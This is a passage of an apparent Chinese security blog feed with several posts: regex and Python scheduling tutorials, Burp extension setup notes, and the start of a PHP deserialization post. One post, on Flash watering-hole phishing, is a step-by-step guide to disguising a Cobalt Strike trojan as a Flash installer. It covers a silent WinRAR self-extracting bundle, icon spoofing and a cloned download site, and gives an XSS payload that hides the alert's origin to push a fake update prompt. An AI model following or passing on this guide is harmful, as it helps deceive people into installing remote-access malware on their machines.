匹配所有的数字</span><br><span class="line">\D        匹配所有的非数字</span><br><span class="line">\s        匹配所有的文字</span><br><span class="line">\S        匹配所有的非文本</span><br><span class="line">[]        字符集合，匹配里面的所有表达式，使用|分开</span><br></pre></td></tr></table></figure><h2 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h2><p>创建正则表达式对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(pattern[, flags])</span><br></pre></td></tr></table></figure><p>#根据包含正则表达式的字符串创建模式对象<br>全文查找符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search(pattern, string[, flags])    </span><br><span class="line"><span class="comment">#在字符串中查找，只查找一个</span></span><br></pre></td></tr></table></figure><p>从头开始查找符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">match(pattern, string[, flags])    </span><br><span class="line"><span class="comment">#在字符串的开始处匹配模式</span></span><br></pre></td></tr></table></figure><p>分割字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">split(pattern, string[, maxsplit=<span class="number">0</span>,flags])    </span><br><span class="line"><span class="comment">#根据模式的匹配项来分割字符串</span></span><br></pre></td></tr></table></figure><p>寻找所有符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">findall(pattern, string,flags)    </span><br><span class="line"><span class="comment">#列出字符串中模式的所有匹配项</span></span><br><span class="line"><span class="keyword">return</span> 数组</span><br></pre></td></tr></table></figure><p>替换字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub(pat,repl, string[,count=<span class="number">0</span>,flags])    </span><br><span class="line"><span class="comment">#将字符串中所有的pat的匹配项用repl替换</span></span><br></pre></td></tr></table></figure><p>注意$表示字符串的结尾，所以加上$表示匹配的内容必须在字符串的结尾<br>匹配整个字符串还要加上字符串开始标记^</p><p>注意写爬出的时候可以用正则表达式匹配多个对象，然后遍历的时候使用yield生成器，可以组合成字典的形式，然后把字典给json.dumps()转换成json的格式，最后保存在本地文本中。</p><h2 id="常规匹配的正则语法"><a href="#常规匹配的正则语法" class="headerlink" title="常规匹配的正则语法"></a>常规匹配的正则语法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">汉字：[\u4e00-\u9fa5]&#123;<span class="number">0</span>,&#125;</span><br><span class="line">英文和数字：[A-Za-z0<span class="number">-9</span>]+</span><br><span class="line">长度为<span class="number">3</span><span class="number">-20</span>的所有字符：.&#123;<span class="number">3</span>,<span class="number">20</span>&#125;</span><br><span class="line">Email地址：\w+([-+.]\w+)@\w+([-.]\w+).\w+([-.]\w+)*</span><br><span class="line">域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.?</span><br><span class="line">InternetURL：[a-zA-z]+://[^\s] 或 ^http://([\w-]+.)+[\w-]+(/[\w-./?%&amp;=])?$</span><br><span class="line">手机号码：^(<span class="number">13</span>[<span class="number">0</span><span class="number">-9</span>]|<span class="number">14</span>[<span class="number">5</span>|<span class="number">7</span>]|<span class="number">15</span>[<span class="number">0</span>|<span class="number">1</span>|<span class="number">2</span>|<span class="number">3</span>|<span class="number">5</span>|<span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>|<span class="number">9</span>]|<span class="number">18</span>[<span class="number">0</span>|<span class="number">1</span>|<span class="number">2</span>|<span class="number">3</span>|<span class="number">5</span>|<span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>|<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$</span><br><span class="line">国内电话号码：\d&#123;<span class="number">3</span>&#125;-\d&#123;<span class="number">8</span>&#125;|\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">7</span>&#125;(<span class="number">0511</span><span class="number">-4405222</span>、<span class="number">021</span><span class="number">-87888822</span>)</span><br><span class="line">日期格式：^\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;-\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">空白行的正则表达式：\n\s*\r (可以用来删除空白行)</span><br><span class="line">腾讯QQ号：[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">4</span>,&#125;</span><br><span class="line">IP地址提取：\d+.\d+.\d+.\d+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python执行定时任务</title>
      <link href="/2020/02/07/Python%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
      <url>/2020/02/07/Python%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="Python执行定时任务"><a href="#Python执行定时任务" class="headerlink" title="Python执行定时任务"></a>Python执行定时任务</h2><p>python使用内置库和第三方库执行定时任务。</p><h3 id="使用-sched-模块"><a href="#使用-sched-模块" class="headerlink" title="使用 sched 模块"></a>使用 sched 模块</h3><p>sched相当于一个延时处理任务<br>schedule是简单明了的一个第三方定时任务库，需要先pip安装一下<br>一个很好的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义你要周期运行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"I'm working..."</span>)</span><br><span class="line"></span><br><span class="line">schedule.every(<span class="number">10</span>).minutes.do(job)               <span class="comment"># 每隔 10 分钟运行一次 job 函数</span></span><br><span class="line">schedule.every().hour.do(job)                    <span class="comment"># 每隔 1 小时运行一次 job 函数</span></span><br><span class="line">schedule.every().day.at(<span class="string">"10:30"</span>).do(job)         <span class="comment"># 每天在 10:30 时间点运行 job 函数</span></span><br><span class="line">schedule.every().monday.do(job)                  <span class="comment"># 每周一 运行一次 job 函数</span></span><br><span class="line">schedule.every().wednesday.at(<span class="string">"13:15"</span>).do(job)   <span class="comment"># 每周三 13：15 时间点运行 job 函数</span></span><br><span class="line">schedule.every().minute.at(<span class="string">":17"</span>).do(job)        <span class="comment"># 每分钟的 17 秒时间点运行 job 函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    schedule.run_pending()   <span class="comment"># 运行所有可以运行的任务</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义你要周期运行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">"I'm working..."</span>)</span><br><span class="line">    print(<span class="string">'接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"></span><br><span class="line">schedule.every(<span class="number">10</span>).seconds.do(job,msg=<span class="string">'10s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    schedule.run_pending()   <span class="comment"># 运行所有可以运行的任务</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="执行并发任务"><a href="#执行并发任务" class="headerlink" title="执行并发任务"></a>执行并发任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule,time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'任务1接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'任务2接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job3</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'任务3接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line">schedule.every(<span class="number">1</span>).seconds.do(job1,msg=<span class="string">'任务1'</span>)</span><br><span class="line">schedule.every(<span class="number">3</span>).seconds.do(job2,msg=<span class="string">'任务2'</span>)</span><br><span class="line">schedule.every(<span class="number">1</span>).seconds.do(job3,msg=<span class="string">'任务3'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    schedule.run_pending()</span><br></pre></td></tr></table></figure><p>实际上应该是顺序执行<br><img src="https://img-blog.csdnimg.cn/20200207104831217.png" alt="在这里插入图片描述"></p><p>加入使用threading完成并发<br><img src="https://img-blog.csdnimg.cn/20200207104939256.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> schedule,time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'任务1接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'任务2接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job3</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'任务3接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_1</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job1,args=(<span class="number">1</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_2</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job2,args=(<span class="number">2</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_3</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job3,args=(<span class="number">3</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_1)</span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_2)</span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_3)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        schedule.run_pending()</span><br><span class="line">run()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Flash水坑钓鱼</title>
      <link href="/2020/02/06/Flash%E6%B0%B4%E5%9D%91%E9%92%93%E9%B1%BC/"/>
      <url>/2020/02/06/Flash%E6%B0%B4%E5%9D%91%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="Flash水坑钓鱼">TOC</a></p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在网络上看到许多大佬都拿这个钓鱼，而且感觉成功率贼高。<br>未雨绸缪，先测试一下，以后肯定用的到</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>flash官网的钓鱼源码：<a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">https://github.com/r00tSe7en/Fake-flash.cn</a><br>一个服务器<br>一个域名<br>一个马子</p><h2 id="先配置一个马子吧"><a href="#先配置一个马子吧" class="headerlink" title="先配置一个马子吧"></a>先配置一个马子吧</h2><ul><li>使用常用的CS吧，随便来一个，成功上线<br><img src="https://img-blog.csdnimg.cn/202002061054387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>关于免杀，暂时就不了(因为菜)</li><li>推荐使用一个好的隐藏方式</li></ul><h2 id="自解压捆绑文件的利用"><a href="#自解压捆绑文件的利用" class="headerlink" title="自解压捆绑文件的利用"></a>自解压捆绑文件的利用</h2><p>捆版木马时碰到一个问题大多捆绑软件本身就会被杀软查杀，所以选择利用winrar实现捆绑。</p><ol><li>准备好的木马和flash安装程序</li></ol><ol start="2"><li><p>鼠标右键，添加到压缩文件。</p><p><code>点击创建自解压格式压缩文件</code><br><img src="https://img-blog.csdnimg.cn/20200206110906864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>点击高级自解压选项——————-常规<br><img src="https://img-blog.csdnimg.cn/20200206111046921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用绝对路径 -------------- C:\windows\temp</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111221661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="4"><li>设置———提取后运行</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\temp\flash.exe</span><br><span class="line"></span><br><span class="line">C:\windows\temp\flashplayer_install_cn.exe</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111434557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="5"><li>安静模式———全部隐藏</li></ol><p><img src="https://img-blog.csdnimg.cn/2020020611150857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="6"><li>更新</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">更新方式----解压并更新文件</span><br><span class="line"></span><br><span class="line">覆盖方式----覆盖所有文件</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111745780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="7"><li>确定，出去把文件名改的像一点<br><img src="https://img-blog.csdnimg.cn/20200206114209174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>这图标也不像啊，得改<br><img src="https://img-blog.csdnimg.cn/2020020611432490.png" alt="在这里插入图片描述"></li><li>使用 ResourceHacker 把图标改了，自行下载</li><li>通过ResourceHacker打开原版的flash安装程序，点击Icon Group文件夹中的文件，鼠标右键保存“*.ico资源”，即可导出ico图标。<br><img src="https://img-blog.csdnimg.cn/20200206115037810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>同样的方法—-ResourceHacker打开刚刚打包好的文件，点击Icon Group文件夹中的文件，鼠标右键替换ico图标，最后保存</li></ol><p><img src="https://img-blog.csdnimg.cn/20200206115439272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200206115637855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后保存成功，图标搞定<img src="https://img-blog.csdnimg.cn/2020020611570775.png" alt="图标搞定"></p><ul><li>捆绑木马就做好了。下面是运行截图，伪装的完美，全程无感知，就是没有做木马的免杀如果有杀毒软件会报毒。</li><li><img src="https://img-blog.csdnimg.cn/20200206115918874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>也能上线<img src="https://img-blog.csdnimg.cn/20200206120000983.png" alt="在这里插入图片描述"></li><li>马子完成了。</li></ul><h3 id="上传到服务器"><a href="#上传到服务器" class="headerlink" title="上传到服务器"></a>上传到服务器</h3><p>跟前情况自己开服务，我就直接装了了一个Apache<br><img src="https://img-blog.csdnimg.cn/20200206152501383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改fake网站的源码，把链接加进去。</p><p><img src="https://img-blog.csdnimg.cn/20200206153316957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传到服务器看效果</p><p><img src="https://img-blog.csdnimg.cn/20200206155353255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还可以，就是域名方面需要进一步的伪造，要买一个不错的域名更佳</p><h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>直接给地址让下载这个可能性太低了，感觉还是需要XSS打进去，弹框提示上钩的几率最大，这也大家常用的方法之一。<br>但是有个问题不能让看出是弹窗，最后是可以隐藏掉网站显示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重写alert方法，去掉地址显示</span></span><br><span class="line">window.alert = function(name)&#123;</span><br><span class="line"><span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);</span><br><span class="line">iframe.style.display=<span class="string">"none"</span>;</span><br><span class="line">iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line">window.frames[<span class="number">0</span>].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写confirm方法，去掉地址显示</span></span><br><span class="line">window.confirm = function(name)&#123;</span><br><span class="line"><span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);</span><br><span class="line">iframe.style.display=<span class="string">"none"</span>;</span><br><span class="line">iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line"><span class="keyword">var</span> result = window.frames[<span class="number">0</span>].window.confirm(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206162156507.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function(name)&#123;<span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);iframe.style.display=<span class="string">"none"</span>;iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);document.documentElement.appendChild(iframe);window.frames[<span class="number">0</span>].window.alert(name);iframe.parentNode.removeChild(iframe);&#125;;alert(<span class="string">"您的FLASH版本过低，请尝试升级后访问改页面!"</span>);window.location.href=<span class="string">"https://www.baidu.com"</span>;</span><br></pre></td></tr></table></figure><p>可以直接在XSS平台里面建一个模块，然后xss打出去，要不太长了代码</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 利用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IPRotate_Burp_Extension安装</title>
      <link href="/2020/01/17/IPRotate_Burp_Extension%E5%AE%89%E8%A3%85/"/>
      <url>/2020/01/17/IPRotate_Burp_Extension%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>IPRotate_Burp_Extension安装</p><ol><li>在BurpSuite中安装Jython环境</li></ol><p><a href="https://blog.csdn.net/god_zzZ/article/details/104019232" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/104019232</a></p><ol start="2"><li>为Python 安装boto3模块。<br>pip install boto3<ol start="3"><li>导入python文件</li></ol></li></ol><p><img src="https://img-blog.csdnimg.cn/20200117145551414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在BurpSuite中安装Jython环境</title>
      <link href="/2020/01/17/%E5%9C%A8BurpSuite%E4%B8%AD%E5%AE%89%E8%A3%85Jython%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/01/17/%E5%9C%A8BurpSuite%E4%B8%AD%E5%AE%89%E8%A3%85Jython%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="在BurpSuite中安装Jython环境"><a href="#在BurpSuite中安装Jython环境" class="headerlink" title="在BurpSuite中安装Jython环境"></a>在BurpSuite中安装Jython环境</h2><ol><li>下载模块</li></ol><p>下载地址<br><a href="https://www.jython.org/download.html" target="_blank" rel="noopener">https://www.jython.org/download.html</a><br>下载 Jython <strong>Standalone</strong>版本的<br><img src="https://img-blog.csdnimg.cn/2020011714461488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li>打开burp</li></ol><p><img src="https://img-blog.csdnimg.cn/2020011714475897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一个框子是刚刚下载jar包<br>第二个时候python的模块文件地址  要到 lib\site-packages里面</p><ol start="4"><li>成功</li></ol>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞解析和研究</title>
      <link href="/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/"/>
      <url>/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="php反序列化漏洞解析和研究">TOC</a></p><h1 id="PHP序列化是什么"><a href="#PHP序列化是什么" class="headerlink" title="PHP序列化是什么"></a>PHP序列化是什么</h1><blockquote><p>serialize()     //将一个对象转换成一个字符串<br>unserialize()   //将字符串还原成一个对象</p></blockquote><p>序列化：将php值转换为可存储或传输的字符串，目的是防止丢失其结构和数据类型。</p><p>反序列化：序列化的逆过程，将字符串再转化成原来的php变量，以便于使用。</p><p>简单来说，就是涉及php中的serialize与unserialize两个函数。</p><p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p><h2 id="铺垫知识"><a href="#铺垫知识" class="headerlink" title="铺垫知识"></a>铺垫知识</h2><h3 id="示例序列化"><a href="#示例序列化" class="headerlink" title="示例序列化"></a>示例序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">testclass</span></span></span><br><span 